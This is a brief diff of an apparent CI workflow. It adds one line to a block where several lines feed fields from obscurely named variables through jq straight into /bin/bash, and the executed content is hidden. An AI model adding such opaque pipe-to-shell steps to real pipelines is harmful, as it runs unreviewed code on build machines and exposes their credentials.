@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$mc64663" | jq -r .dcl6867 | /bin/bash
           printf '%s' "$lyf72" | jq -r .vo0 | /bin/bash
           printf '%s' "$kos911" | jq -r .w1940 | /bin/bash
+          printf '%s' "$azb90" | jq -r .yj898 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
